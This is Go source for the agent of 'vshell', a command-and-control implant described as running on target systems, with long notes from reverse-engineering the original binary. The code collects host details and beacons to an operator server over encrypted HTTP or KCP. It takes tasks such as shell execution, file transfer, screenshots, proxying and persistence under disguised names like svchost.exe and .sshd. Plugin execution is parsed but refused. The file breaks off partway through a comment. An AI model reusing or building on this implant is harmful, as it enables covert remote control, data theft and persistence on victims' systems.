// Package agent 实现运行在目标系统上的 vshell Agent，支持 HTTP、DNS、KCP 与 WebSocket 传输模式。
// Package agent implements the vshell agent that runs on target systems.
// Supports HTTP, DNS, KCP, and WebSocket transport modes.
//
//go:build !server
// +build !server

package main

import (
	"bytes"
	"crypto/rand"
	"encoding/base64"
	"encoding/binary"
	"encoding/json"
	"fmt"
	"io"
	"log"
	"net"
	"net/http"
	"net/url"
	"os"
	"os/exec"
	"os/user"
	"runtime"
	"sort"
	"strconv"
	"strings"
	"sync"
	"time"

	kcp "github.com/xtaci/kcp-go/v5"
)

// ============================================================================
// Embedded Configuration (patched at build time via ldflags)
// 嵌入式配置（构建时通过 ldflags 修补）
// ============================================================================
var (
	ServerAddr  = "REPLACE_SERVER_ADDR___XXXXXXXXXXXXXXXXXXXXXXXX"
	VerifyKey   = "REPLACE_VERIFY_KEY___XXXXXXXXXXXXXXXXXXXXXXXX"
	EncryptSalt = "REPLACE_ENCRYPT_SALT_XXXXXXXXXXXXXXXXXXXXXXXX"
	ProxyAddr   = "REPLACE_PROXY_ADDR___XXXXXXXXXXXXXXXXXXXXXXXX"
	CDNURL      = "REPLACE_CDN_URL______XXXXXXXXXXXXXXXXXXXXXXXX"
	DNSServer   = "REPLACE_DNS_SERVER___XXXXXXXXXXXXXXXXXXXXXXXX"

	sleepTime    = 5
	jitterTime   = 3
	clientID     int64
	sessionID    string
	hostname     string
	username     string
	osName       = runtime.GOOS
	arch         = runtime.GOARCH
	processName  string
	localIP      string
	pid          int
	agentVersion = "3.1.0"
	transport    Transport
	persistPath  string
)

func init() {
	pid = os.Getpid()
	hostname, _ = os.Hostname()
	if u, err := user.Current(); err == nil {
		username = u.Username
	}
	if username == "" {
		username = os.Getenv("USER")
	}
	if exe, err := os.Executable(); err == nil {
		processName = exe
	} else {
		processName = os.Args[0]
	}
	if addrs, err := net.InterfaceAddrs(); err == nil {
		for _, addr := range addrs {
			if ipn, ok := addr.(*net.IPNet); ok && !ipn.IP.IsLoopback() && ipn.IP.To4() != nil {
				localIP = ipn.IP.String()
				break
			}
		}
	}

	// Default persistence path
	if runtime.GOOS == "windows" {
		persistPath = os.Getenv("APPDATA") + "\\Microsoft\\Windows\\svchost.exe"
	} else {
		persistPath = os.Getenv("HOME") + "/.cache/.sshd"
	}

	log.SetPrefix(fmt.Sprintf("[%d] ", pid))
}

// ============================================================================
// System info gathering
// 系统信息收集
// ============================================================================

// SysInfo 保存 Agent 上报的系统信息。
// SysInfo holds the system info reported by the agent.
type SysInfo struct {
	Hostname    string   `json:"hostname"`
	Username    string   `json:"username"`
	OS          string   `json:"os"`
	Arch        string   `json:"arch"`
	CPUCores    int      `json:"cpu_cores"`
	PID         int      `json:"pid"`
	PPID        int      `json:"ppid"`
	ProcessName string   `json:"process_name"`
	LocalIPs    []string `json:"local_ips"`
	IsAdmin     bool     `json:"is_admin"`
	Uptime      string   `json:"uptime"`
	GoVersion   string   `json:"go_version"`
}

// getSysInfo 收集并返回系统信息。
// getSysInfo collects and returns system info.
func getSysInfo() *SysInfo {
	info := &SysInfo{
		Hostname:    hostname,
		Username:    username,
		OS:          runtime.GOOS,
		Arch:        runtime.GOARCH,
		CPUCores:    runtime.NumCPU(),
		PID:         pid,
		PPID:        os.Getppid(),
		ProcessName: processName,
		GoVersion:   runtime.Version(),
	}

	// Check admin/root
	if runtime.GOOS == "windows" {
		info.IsAdmin = isWindowsAdmin()
	} else {
		info.IsAdmin = os.Geteuid() == 0
	}

	// Collect all local IPs
	addrs, _ := net.InterfaceAddrs()
	for _, addr := range addrs {
		if ipn, ok := addr.(*net.IPNet); ok && ipn.IP.To4() != nil {
			info.LocalIPs = append(info.LocalIPs, ipn.IP.String())
		}
	}

	return info
}

// isWindowsAdmin 判断当前是否以管理员权限运行。
// isWindowsAdmin reports whether the process runs with administrator privileges.
func isWindowsAdmin() bool {
	f, err := os.Open("\\\\.\\PHYSICALDRIVE0")
	if err != nil {
		return false
	}
	f.Close()
	return true
}

// ============================================================================
// Transport interface and implementations
// 传输接口与实现
// ============================================================================

// Transport 抽象不同 C2 传输模式（HTTP/KCP/DNS/WebSocket）。
// Transport abstracts the different C2 transport modes (HTTP/KCP/DNS/WebSocket).
type Transport interface {
	Checkin() (*CheckinResponse, error)
	GetTasks() ([]TaskItem, error)
	SendResult(taskID int64, result, status string) error
	Close() error
}

// --- HTTP Transport ---
// HTTP 传输

type httpTransport struct {
	serverURL string
	client    *http.Client
}

// newHTTPTransport 创建 HTTP 传输。
// newHTTPTransport creates an HTTP transport.
func newHTTPTransport(url string) *httpTransport {
	return &httpTransport{
		serverURL: strings.TrimRight(url, "/"),
		client:    &http.Client{Timeout: 30 * time.Second},
	}
}

// postJSON 向服务器发送 JSON 请求。
// 消息体经 AES-256-GCM 帧加密（与 TCP/KCP 统一格式，服务器对所有入站
// 帧 GCM Open），base64 编码放入 HTTP body。
// postJSON sends a JSON request to the server. The body is wrapped in the
// AES-256-GCM message frame (same key/format as TCP/KCP), base64-encoded.
func (t *httpTransport) postJSON(path string, data []byte) (*http.Response, error) {
	enc := encryptFrame(data)
	body := []byte(base64.StdEncoding.EncodeToString(enc))
	return t.client.Post(t.serverURL+path, "application/json", bytes.NewReader(body))
}

// Checkin 执行 Agent 签到。
// Checkin performs the agent check-in.
func (t *httpTransport) Checkin() (*CheckinResponse, error) {
	req := CheckinRequest{
		VerifyKey:   VerifyKey,
		HostName:    hostname,
		UserName:    username,
		OsName:      runtime.GOOS,
		ProcessName: processName,
		LocalIP:     localIP,
		Arch:        runtime.GOARCH,
		PID:         pid,
		Version:     agentVersion,
	}
	body, _ := json.Marshal(req)
	resp, err := t.postJSON("/api/checkin", body)
	if err != nil {
		return nil, err
	}
	defer resp.Body.Close()
	var cr CheckinResponse
	json.NewDecoder(resp.Body).Decode(&cr)
	if cr.ClientID > 0 {
		clientID = cr.ClientID
		sessionID = cr.SessionID
	}
	if cr.Interval > 0 {
		sleepTime = cr.Interval
	}
	return &cr, nil
}

// GetTasks 轮询待处理任务。
// GetTasks polls for pending tasks.
func (t *httpTransport) GetTasks() ([]TaskItem, error) {
	url := fmt.Sprintf("%s/api/tasks?client_id=%d&verify_key=%s", t.serverURL, clientID, url.QueryEscape(VerifyKey))
	resp, err := t.client.Get(url)
	if err != nil {
		return nil, err
	}
	defer resp.Body.Close()
	var tr TaskResponse
	json.NewDecoder(resp.Body).Decode(&tr)
	if tr.Interval > 0 {
		sleepTime = tr.Interval
	}
	if tr.Tasks == nil {
		return nil, nil
	}
	return tr.Tasks, nil
}

// SendResult 回传任务结果。
// 消息体与签到一样经 AES-256-GCM 帧加密（服务器在 JSON 解析失败时回退到
// FrameDecrypt 解帧）。
// SendResult submits a task result. The body is wrapped in the same
// AES-256-GCM message frame as check-in (the server falls back to
// FrameDecrypt when plain JSON parsing fails).
func (t *httpTransport) SendResult(taskID int64, result, status string) error {
	req := ResultRequest{
		ClientID:  clientID,
		CommandID: taskID,
		Result:    result,
		Status:    status,
		VerifyKey: VerifyKey,
	}
	body, _ := json.Marshal(req)
	resp, err := t.postJSON("/api/result", body)
	if err != nil {
		return err
	}
	resp.Body.Close()
	return nil
}

// Close 关闭 HTTP 传输（无状态，空操作）。
// Close closes the HTTP transport (stateless, no-op).
func (t *httpTransport) Close() error { return nil }

// --- KCP Transport ---
// KCP 传输：服务器 KCP 监听器（c2engine/kcp.go）是带 AES 块加密 + FEC 的 kcp-go UDP
// 监听器，Agent 必须使用相同的线协议：
//
// The server's KCP listener (c2engine/kcp.go) is a kcp-go UDP listener with
// AES block crypt + FEC. The agent must speak the same wire protocol:
//   - connection: kcp-go UDP session (NOT plain TCP/UDP sockets)
//   - handshake: bare JSON check-in payload (no length prefix, no type byte)
//   - subsequent messages: [2-byte big-endian length][1-byte LinkMsgType][payload]
// The link message type constants mirror c2engine.LinkMsgType.

const (
	linkMsgMain   = 0x01 // main data channel (task poll, results)
	linkMsgConfig = 0x02 // configuration sync
	linkMsgChan   = 0x03 // tunnel/proxy data
	linkMsgHealth = 0x04 // health/heartbeat
	linkMsgClose  = 0x05 // close connection
)

// kcpTransport 是基于 KCP 的传输实现。
// kcpTransport is the KCP-based transport implementation.
type kcpTransport struct {
	serverAddr string
	sess       *kcp.UDPSession
	mu         sync.Mutex
}

// newKCPTransport 创建 KCP 传输。
// newKCPTransport creates a KCP transport.
func newKCPTransport(addr string) *kcpTransport {
	return &kcpTransport{serverAddr: addr}
}

// kcpBlockCrypt derives the AES key exactly as the server does: the raw
// concatenated salt+key material padded to 32 bytes (the server's plain [:32]
// slice panics on short keys, so both sides pad instead).
func kcpBlockCrypt(salt, key string) kcp.BlockCrypt {
	m := []byte(salt + key)
	if len(m) < 32 {
		m = append(m, make([]byte, 32-len(m))...)
	}
	block, _ := kcp.NewAESBlockCrypt(m[:32])
	return block
}

// connect 建立 KCP 会话。
// connect establishes the KCP session.
func (t *kcpTransport) connect() error {
	if t.sess != nil {
		t.sess.Close()
		t.sess = nil
	}
	sess, err := kcp.DialWithOptions(t.serverAddr, kcpBlockCrypt(EncryptSalt, VerifyKey), 10, 3)
	if err != nil {
		return err
	}
	// Mirror the server-side session tuning (acceptLoop).
	sess.SetStreamMode(true)
	sess.SetWriteDelay(false)
	sess.SetNoDelay(1, 10, 2, 1)
	sess.SetWindowSize(128, 128)
	sess.SetMtu(1350)
	t.sess = sess
	return nil
}

// maxKCPFrame keeps a single frame under the link protocol's 2-byte length
// prefix (65535) with headroom for the type byte; larger payloads are split
// into fragments and reassembled server-side.
const maxKCPFrame = 60000

// writeFrame 发送类型化、长度前缀消息（链路协议）。
// 消息体经 AES-256-GCM 帧加密（与 TCP 消息帧同 key/格式，服务器统一
// GCM Open 解密）。
// writeFrame sends a typed, length-prefixed message (link protocol).
// The payload is wrapped in the AES-256-GCM message frame (same key/
// format as TCP frames; the server GCM-opens every inbound frame).
func (t *kcpTransport) writeFrame(msgType byte, data []byte) error {
	if t.sess == nil {
		if err := t.connect(); err != nil {
			return err
		}
	}
	enc := encryptFrame(data)
	if len(enc)+1 > maxKCPFrame {
		return t.writeFragmented(data)
	}
	msg := make([]byte, 1+len(enc))
	msg[0] = msgType
	copy(msg[1:], enc)

	lenBuf := make([]byte, 2)
	binary.BigEndian.PutUint16(lenBuf, uint16(len(msg)))
	t.sess.SetWriteDeadline(time.Now().Add(10 * time.Second))
	if _, err := t.sess.Write(append(lenBuf, msg...)); err != nil {
		t.sess.Close()
		t.sess = nil
		return err
	}
	return nil
}

// writeFragmented 将超大载荷（如截图或屏幕帧）拆分为 maxKCPFrame 大小的分片，
// 每个分片是携带 {"_frag":k,"_total":n,"_data":<base64 chunk>} 的 LinkMsgMain
// 帧，服务器在处理前重组。
// writeFragmented splits an oversized payload (e.g. a screenshot or screen
// frame) into maxKCPFrame-sized fragments. Each fragment is a LinkMsgMain
// frame carrying {"_frag":k,"_total":n,"_data":<base64 chunk>}; the server
// reassembles them before handling the message.
func (t *kcpTransport) writeFragmented(data []byte) error {
	const chunkBytes = maxKCPFrame / 4 * 3 // base64 expands 4/3
	var chunks [][]byte
	for len(data) > 0 {
		n := len(data)
		if n > chunkBytes {
			n = chunkBytes
		}
		chunks = append(chunks, data[:n])
		data = data[n:]
	}
	total := len(chunks)
	for i, c := range chunks {
		frag, _ := json.Marshal(map[string]interface{}{
			"_frag":  i,
			"_total": total,
			"_data":  base64.StdEncoding.EncodeToString(c),
		})
		msg := make([]byte, 1+len(frag))
		msg[0] = linkMsgMain
		copy(msg[1:], frag)
		lenBuf := make([]byte, 2)
		binary.BigEndian.PutUint16(lenBuf, uint16(len(msg)))
		t.sess.SetWriteDeadline(time.Now().Add(30 * time.Second))
		if _, err := t.sess.Write(append(lenBuf, msg...)); err != nil {
			t.sess.Close()
			t.sess = nil
			return err
		}
	}
	return nil
}

// readFrame 读取一条类型化、长度前缀消息，跳过服务器心跳（服务器每 10 秒推送 LinkMsgHealth）。
// 消息体经 AES-256-GCM 帧解密。
// readFrame reads one typed, length-prefixed message, skipping server
// heartbeats (the server pushes LinkMsgHealth every 10s on its own).
// The payload is GCM-opened (same frame format as TCP).
func (t *kcpTransport) readFrame() (byte, []byte, error) {
	if t.sess == nil {
		return 0, nil, io.ErrClosedPipe
	}
	for {
		lenBuf := make([]byte, 2)
		t.sess.SetReadDeadline(time.Now().Add(15 * time.Second))
		if _, err := io.ReadFull(t.sess, lenBuf); err != nil {
			return 0, nil, err
		}
		length := binary.BigEndian.Uint16(lenBuf)
		data := make([]byte, length)
		if _, err := io.ReadFull(t.sess, data); err != nil {
			return 0, nil, err
		}
		if length == 0 {
			return 0, nil, nil
		}
		if data[0] == linkMsgHealth {
			continue
		}
		pt, err := decryptFrame(data[1:])
		if err != nil {
			return 0, nil, err
		}
		return data[0], pt, nil
	}
}

func (t *kcpTransport) Checkin() (*CheckinResponse, error) {
	hs := map[string]interface{}{
		"verify_key": VerifyKey,
		"hostname":   hostname,
		"username":   username,
		"os":         runtime.GOOS,
		"process":    processName,
	}
	data, _ := json.Marshal(hs)

	t.mu.Lock()
	defer t.mu.Unlock()

	if t.sess == nil {
		if err := t.connect(); err != nil {
			return nil, err
		}
	}
	// Handshake: bare JSON, exactly what the server's handleSession reads.
	t.sess.SetWriteDeadline(time.Now().Add(10 * time.Second))
	if _, err := t.sess.Write(data); err != nil {
		t.sess.Close()
		t.sess = nil
		return nil, err
	}

	msgType, resp, err := t.readFrame()
	if err != nil {
		return nil, err
	}
	if msgType != linkMsgMain {
		return nil, fmt.Errorf("unexpected check-in response type %d", msgType)
	}
	var cr CheckinResponse
	if err := json.Unmarshal(resp, &cr); err != nil {
		return nil, err
	}
	if cr.ClientID > 0 {
		clientID = cr.ClientID
	}
	return &cr, nil
}

func (t *kcpTransport) GetTasks() ([]TaskItem, error) {
	req, _ := json.Marshal(map[string]interface{}{"type": "task_poll", "client_id": clientID, "verify_key": VerifyKey})

	t.mu.Lock()
	defer t.mu.Unlock()

	if err := t.writeFrame(linkMsgMain, req); err != nil {
		return nil, err
	}
	_, resp, err := t.readFrame()
	if err != nil {
		return nil, err
	}
	var tr TaskResponse
	if err := json.Unmarshal(resp, &tr); err != nil {
		return nil, err
	}
	return tr.Tasks, nil
}

func (t *kcpTransport) SendResult(taskID int64, result, status string) error {
	// 未对齐点（已知、未修）：KCP 链路仍用 ResultRequest JSON 信封，而原版把
	// 结果写成 24 字节记录块（见 transport_real.go 的 SendResult 与 main.go
	// 「结果帧」一节）。KCP 的服务器侧按 JSON 键路由（c2engine/kcp.go 的
	// LinkMsgMain 分支），改成记录需要同步改那一侧，而这不属于本次改动范围。
	req, _ := json.Marshal(ResultRequest{ClientID: clientID, CommandID: taskID, Result: result, Status: status, VerifyKey: VerifyKey})

	t.mu.Lock()
	defer t.mu.Unlock()

	// The server does not acknowledge individual results (LinkMsgMain handler
	// only stores/forwards them), so no response read here.
	return t.writeFrame(linkMsgMain, req)
}

func (t *kcpTransport) Close() error {
	t.mu.Lock()
	defer t.mu.Unlock()
	if t.sess != nil {
		t.writeFrame(linkMsgClose, nil)
		t.sess.Close()
		t.sess = nil
	}
	return nil
}

// ============================================================================
// Message types
// 协议消息类型
// ============================================================================

// CheckinRequest 是签到请求。
// CheckinRequest is the check-in request.
type CheckinRequest struct {
	VerifyKey   string `json:"verify_key"`
	HostName    string `json:"hostname"`
	UserName    string `json:"username"`
	OsName      string `json:"os"`
	ProcessName string `json:"process"`
	LocalIP     string `json:"local_ip"`
	Arch        string `json:"arch,omitempty"`
	PID         int    `json:"pid,omitempty"`
	Version     string `json:"version,omitempty"`
}

// CheckinResponse 是签到响应。
// CheckinResponse is the check-in response.
type CheckinResponse struct {
	Status    string `json:"status"`
	ClientID  int64  `json:"client_id"`
	SessionID string `json:"session_id"`
	Interval  int    `json:"interval"`
	Timeout   int    `json:"timeout"`
	Message   string `json:"message,omitempty"`
}

// TaskResponse 是任务轮询响应。
// TaskResponse is the task polling response.
type TaskResponse struct {
	Tasks    []TaskItem `json:"tasks"`
	Interval int        `json:"interval"`
}

// TaskItem 是单条任务。
// TaskItem is a single task.
type TaskItem struct {
	ID      int64  `json:"id"`
	Command string `json:"command"`
	Timeout int    `json:"timeout"`
}

// ResultRequest 是结果回传请求。
// ResultRequest is the result submission request.
type ResultRequest struct {
	ClientID  int64  `json:"client_id"`
	CommandID int64  `json:"command_id"`
	Result    string `json:"result"`
	Status    string `json:"status"`
	// VerifyKey proves the caller knows the listener key; the server rejects
	// task/result requests without it when the listener has a key set.
	VerifyKey string `json:"verify_key,omitempty"`
}

// ============================================================================
// Command execution
// 命令执行
// ============================================================================

const (
	CmdShell      = "shell"
	CmdUpload     = "upload"
	CmdDownload   = "download"
	CmdSleep      = "sleep"
	CmdExit       = "exit"
	CmdScreenshot = "screenshot"
	CmdScreen     = "screen"
	CmdFileList   = "filelist"
	CmdFileDelete = "filedelete"
	CmdFileMove   = "filemove"
	CmdFileTouch  = "filetouch"
	CmdFileMkdir  = "filemkdir"
	CmdFileCat    = "filecat"
	CmdDiskInfo   = "diskinfo"
	CmdPS         = "ps"
	CmdKill       = "kill"
	CmdSysInfo    = "sysinfo"
	CmdPersist    = "persist"
	CmdCleanup    = "cleanup"
	CmdProxy      = "proxy"
	CmdProxyStop  = "proxystop"
	// CmdPlugin 对应原版的 runplugin 任务。面板控制器拼出的命令是
	// `runplugin <hex> <procArg> <true|false>`（见下方「Plugin / runner」一节），
	// 不是 JSON 的 "plugin" 信封；这里同时保留两者，JSON 形态只是复刻端既有的
	// 命令词汇表条目。
	CmdPlugin = "plugin"
	CmdWget   = "wget"
)

// ============================================================================
// Plugin / runner（原版 runplugin）—— 结构与内容来源
//
// 原版的任务执行入口是 FUN_01152dc0（与 FUN_01153100 / FUN_011541e0 同族的
// 命令执行器，服务「连接记录 / 命令记录」对象），其首个分支按命令文本分派：
//
//	FUN_01153100  命令执行器：FUN_00ec0cc0 建 4 字节状态单元，
//	              逐条与命令文本做 FUN_00fc02c0（大小写不敏感比较，查表
//	              DAT_1e2f00a0）匹配；匹配失败则回退到接收缓冲上的通用解析。
//	              runplugin 走的是最后这条回退路径，**不是**一张显式的
//	              命令名常量表——因此静态侧看不到它的字面量。
//	FUN_011541e0  包装：先 FUN_01152dc0 把命令写进接收缓冲，再
//	              FUN_0101a9e0 / FUN_0101a760 取回缓冲首地址与长度交给调用者。
//	FUN_0113e2c0  接收缓冲：按需分配（+0x80 / +0x78），返回缓冲对象。
//
// 命令内容 = 全量插件字节的**十六进制展开**（控制器侧 FUN_018fd220 用表
// DAT_1bdc772 = "0123456789abcdef" 每字节展开成 2 字符，拼成
// `runplugin <hex> <procArg> <true|false>`，.net 插件末位为 true）。
// 命令文本本身不含扩展名——插件类型由服务器先选定（.dll/.net/.exe + 架构）。
//
// 未恢复、因此本实现只做「解析 + 拒绝」的部分：
//
//	1. 十六进制 → 字节的落盘方式（写哪个路径、是否先 chmod）无据可查。
//	2. 执行方式按插件类型不同（.exe 起进程 / .dll 与 .net 需进程内装载），
//	   而二进制链接的 LoadLibraryA/W/ExW（0x0202cca4 / 0x026b6918 / 0x026b6928 …）
//	   没有任何一处能反查到 runplugin 这条路径；类型推断（命令里没有扩展名）
//	   同样未恢复。
//	3. FUN_01b960 / FUN_01b540 等只是通道侧的原语，不构成插件装载的证据。
//
// 因此 dispatchPluginCommand 校验命令形状后**明确拒绝**，既不执行，也不构造
// 落盘/装载流程。端到端的插件执行目前被服务器侧的载荷缺口（控制器不 dispatch）
// 与本节的装载缺口共同阻塞。
// ============================================================================

// pluginCommand 是原版 runplugin 命令解析出的形状。
// pluginCommand is the parsed shape of the original's runplugin command.
type pluginCommand struct {
	// Hex 是插件字节的十六进制展开（原版 FUN_018fd220 以 "0123456789abcdef"
	// 生成，故原版恒为小写；解析时两者都接受）。
	Hex string
	// ProcArg 是面板的 procArg 字段（原版直接原样拼进命令，可含空格）。
	ProcArg string
	// IsNet 是命令末位的布尔：原版 .net 插件为 true，其余为 false。
	IsNet bool
}

// pluginCommandPrefix 是原版 runplugin 命令的命令字。
// 说明：该字面量在静态镜像里读不到（见上方 FUN_01153100 的说明），这里用的是
// 控制器侧 RunPlugin 注释中已记录的拼装结果；它同时也是服务器实际会发出的文本。
const pluginCommandPrefix = "runplugin"

// parsePluginCommand 解析 `runplugin <hex> <procArg> <true|false>`。
//
// 形状（而非内容）来自控制器侧的拼装：命令字 + 空格 + 十六进制 + 空格 +
// procArg + 空格 + 布尔。procArg 原样拼接、不加引号，因此可能含空格——按
// 「首个空格切出 hex、末个空格切出布尔、其余即 procArg」解析，procArg 为空时
// 中间会留下连续空格，同样能解析。
//
// 返回 (cmd, "") 表示形状合法（内容仍不执行）；否则 (nil, 原因)。
func parsePluginCommand(cmdStr string) (*pluginCommand, string) {
	s := strings.TrimSpace(cmdStr)
	if !strings.HasPrefix(s, pluginCommandPrefix) {
		return nil, "not a " + pluginCommandPrefix + " command"
	}
	rest := strings.TrimPrefix(s, pluginCommandPrefix)
	if rest == "" || rest[0] != ' ' {
		// "runpluginx ..." 不是本命令
		return nil, "not a " + pluginCommandPrefix + " command"
	}
	rest = rest[1:]

	// 末个空格切出布尔位。
	i := strings.LastIndexByte(rest, ' ')
	if i < 0 {
		return nil, "runplugin: missing <hex> <procArg> <true|false>"
	}
	flag := rest[i+1:]
	head := rest[:i]
	if flag != "true" && flag != "false" {
		return nil, "runplugin: last field must be true or false"
	}

	// 首个空格切出十六进制载荷，其余为 procArg。
	j := strings.IndexByte(head, ' ')
	if j < 0 {
		// 只有 hex + flag（procArg 为空且被折叠）——原版会留两个空格，这里
		// 不接受这种缺失，避免把 hex 当成 procArg。
		return nil, "runplugin: missing <procArg>"
	}
	hexStr := head[:j]
	procArg := head[j+1:]
	if hexStr == "" {
		return nil, "runplugin: empty plugin payload"
	}
	if len(hexStr)%2 != 0 {
		return nil, "runplugin: plugin payload is not an even-length hex string"
	}
	for k := 0; k < len(hexStr); k++ {
		c := hexStr[k]
		if !(c >= '0' && c <= '9' || c >= 'a' && c <= 'f' || c >= 'A' && c <= 'F') {
			return nil, "runplugin: plugin payload is not a hex string"
		}
	}
	return &pluginCommand{Hex: hexStr, ProcArg: procArg, IsNet: flag == "true"}, ""
}

// dispatchPluginCommand 校验 runplugin 命令并明确拒绝执行。
//
// 为什么不执行：插件字节的落盘方式与按类型的装载/启动方式都没有恢复（见上方
// 「Plugin / runner」一节的第 1、2 点），任何实现都会是编造的。这里只把形状
// 校验做到位——将来补上装载实现时，这个入口就是接线点。
func dispatchPluginCommand(cmdStr string) (string, string) {
	cmd, reason := parsePluginCommand(cmdStr)
	if cmd == nil {
		return "", reason
	}
	return "", fmt.Sprintf(
		"runplugin: plugin execution not implemented (payload of %d bytes and procArg parsed, but the original's write/load/execute path is unrecovered; see agent/main.go plugin section)",
		len(cmd.Hex)/2)
}

// ============================================================================
// Native command opcodes — FUN_010952e0
// 原生命令操作码
//
// The original agent's task-execute dispatcher FUN_010952e0 (0x10952e0) is a
// jump table indexed by the FIRST BYTE of the task's command buffer.
//
// 跳转表定位（本次从二进制修正，取代早前「表在 DAT_1dc31ce0、操作码 = 字节值」
// 的说法 —— 那个说法整体偏移了一位）：
//
//	01095828: MOVZX R9D,byte ptr [RDX + 0x8]   ; RDX = case 0x1f 的 0x18 字节记录
//	01095830: DEC R9                           ; R9 = 操作码 - 1
//	01095833: CMP R9,0x2a
//	01095837: JA  0x0109774f                   ; default 分支
//	0109583d: LEA RAX,[0x1dc31e40]             ; ← 真正的跳转表（43 项）
//	01095844: JMP qword ptr [RAX + R9*0x8]
//
// 即「记录偏移 +8 的字节 = 操作码」，分派键是 (操作码-1)，所以 Ghidra 反编译里
// 的 `case K` 对应操作码 K+1。逐条比对目标地址可验证：操作码 0x0e → 0x1096277
// 读 [local_280+0x2c] 的 bit6 并用表 0x1e2e9ee0（正是反编译 case 0xd 工作模式）；
// 操作码 0x29 → 0x10974d2 用 [local_398+0x298]（case 0x28 keep-alive）；
// 操作码 0x24 → 0x1097054 与 case 0x23 tunnel 计数逐条指令一致。
//
// 表内 43 槽，槽位 i 承载操作码 i+1（由 DEC R9 直接得出），因此操作码是连续的
// 0x01..0x2b，没有空洞。43 槽中恰有 2 槽指向 default 分支 0x109774f：槽 4 → 操作码
// 0x05，槽 0x18 → 操作码 0x19；其余 41 槽各有真实处理块。
//
// 逐槽列出的目标地址（可用表内偏移核对：0x1dc31e40 + i*8）：
//
//   byte 0x01 cmdInterval      interval get/set（dec case 0x0 @0x1095848）
//   byte 0x02 cmdScreenshot    截图/帧记录（dec case 0x1 @0x10958f2）
//   byte 0x03 cmdSleepMode     sleep mode get/set（dec case 0x2 @0x1095a5c）
//   byte 0x04 cmdDebugLog      debug/日志标志位（dec case 0x3 @0x1095ba5）
//   byte 0x05 （default 分支 @0x109774f，与 0x19 共享）
//   byte 0x06 cmdNetCheck      记录字段所指对象的 +0x74 读写（dec case 0x5 @0x1095d13）
//   byte 0x07 cmdTunnelLog     dec case 0x6 @0x1095d90
//   byte 0x08 cmdTunnelDump    dec case 0x7 @0x1095ea0
//   byte 0x09 cmdConnStat      遍历 [local_280+0x290] 链表（dec case 0x8 @0x1095ee5）
//   byte 0x0a cmdSysList       大 dump 分支（dec case 0x9 @0x1095f17）
//   byte 0x0b cmdSetGateway    网关/前置地址（dec case 0xa @0x1095f36）
//   byte 0x0c cmdPortMapDump   端口映射表 dump（dec case 0xb @0x1096110）
//   byte 0x0d cmdSetSendDly    发送延迟（dec case 0xc @0x1096126）
//   byte 0x0e cmdSetWorkMode   工作模式（表 0x1e2e9ee0）（dec case 0xd @0x1096277）
//   byte 0x0f cmdConnDump      连接 dump（dec case 0xe @0x10962fc）
//   byte 0x10 cmdPipeDump      管道/代理 dump（dec case 0xf @0x1096380）
//   byte 0x11 cmdPingIntv      ping 间隔（dec case 0x10 @0x1096445）
//   byte 0x12 cmdTcpPing       tcp ping（dec case 0x11 @0x1096488）
//   byte 0x13 cmdIfList        接口列表（dec case 0x12 @0x109654c）
//   byte 0x14 cmdIfDetail      接口详情（dec case 0x13 @0x10966c7）
//   byte 0x15 cmdProxyList     代理列表 dump（dec case 0x14 @0x1096800）
//   byte 0x16 cmdSysList2      dec case 0x15 @0x109688d
//   byte 0x17 cmdNetRoute      路由/接口选择（dec case 0x16 @0x10969f5）
//   byte 0x18 cmdMtu           MTU（dec case 0x17 @0x1096a2d）
//   byte 0x19 （default 分支 @0x109774f，与 0x05 共享）
//   byte 0x1a cmdSysTime       系统时间（dec case 0x19 @0x1096af0）
//   byte 0x1b cmdPing          ping 往返毫秒（dec case 0x1a @0x1096b51）
//   byte 0x1c cmdReconnect     重连间隔（dec case 0x1b @0x1096cd2）
//   byte 0x1d cmdHostScan      主机/网段扫描（dec case 0x1c @0x1096d65）
//   byte 0x1e cmdUploadSpeed   上传限速（dec case 0x1d @0x1096d8c）
//   byte 0x1f cmdPingInterval  读 [local_2a0[1]+8]+0x34（dec case 0x1e @0x1096e2c）
//   byte 0x20 cmdFileList      0x43 项「命令名表」DAT_1e302680（dec case 0x1f @0x1096edd）
//   byte 0x21 cmdClientLimit   许可/客户端上限（dec case 0x20 @0x1096ee5）
//   byte 0x22 cmdRelicense     重载 license（dec case 0x21 @0x1096f8c）
//   byte 0x23 cmdDestroy       销毁/退出（dec case 0x22 @0x1096fba）
//   byte 0x24 cmdTunnelCount   tunnel 数量（dec case 0x23 @0x1097054）
//   byte 0x25 cmdProcList      进程列表（dec case 0x24 @0x1097165）
//   byte 0x26 cmdSvcList       服务列表（dec case 0x25 @0x1097230）
//   byte 0x27 cmdSysInfo       系统信息（dec case 0x26 @0x1097269）
//   byte 0x28 cmdSetDomain     域名/SNI（dec case 0x27 @0x10972be）
//   byte 0x29 cmdKeepAlive     keep-alive（dec case 0x28 @0x10974d2）
//   byte 0x2a cmdThreadCount   线程数（dec case 0x29 @0x109759a）
//   byte 0x2b cmdFwdPort       转发端口 1/2/3（dec case 0x2a @0x1097625）
//
// 0x19 是合法操作码（槽 0x18 有表项），只是该槽与 0x05 一样落到 default 分支 ——
// 这跟「不在表内」是两回事：43 槽与「恰好 2 槽指向 default」是同一个事实的两面。
// 运行时 0x19 是否可达仍未定：若原编译器在「索引 = 操作码-1」上的 case 集合是连续的
// （0x00..0x2a），那么它对应源码里的 `case 0x18`，本该是一个真实分支，而表项却指向
// default —— 这条矛盾没有解决，不要把它当成已知。
// Opcode 0x19 exists as a table slot and maps to the default branch; which branch the
// original's decremented-index `case 0x18` actually took is UNRESOLVED.
//
// 早前版本的错误：把 0x1b 也说成 default 分支（实为 dec case 0x1a ping，表项
// 0x1dc31f10 → 0x1096b51），并据此漏掉了 0x1a（sysTime，表项 0x1dc31f08 →
// 0x1096af0），还额外发明了一个不存在的 opCmdPing = 0x1a。两处都已纠正。
//
// All result frames are built by pushing "commands" into the engine's output
// buffer via FUN_0100d160 / FUN_0100d440 / FUN_0100d5e0; see the result-frame
// section below (resultFrame / emitScalar / emitString / emitFormat).
//
// 注意/CAVEAT：下面每个操作码的助记名是依据分支行为给出的描述性标签，并非从
// 二进制里还原出的字符串。操作码字节本身与分支行为是实锤；名字不是。
//
// 关于 DAT_1e302680：**它不是命令名表**，读它的记录不有助于实现操作码。
// 复核证据（2026-09）：
//   1) 加载期整表被 0x117b989 起的代码重写（`MOV RAX,[0x1e490a08]; ADD
//      RAX,imm32; MOV [0x1e302680+24k],RAX`），即每项首字段是指向运行期
//      字符串池的指针，静态镜像里为 0；
//   2) 那张池用「目标块 − 源块、逐字节 mod 256、长度 0x9aff」解出（0x116d020
//      装载，0x116d0c2 解码），得到 SQLite 的 pragma 名表（pool+0x4540 =
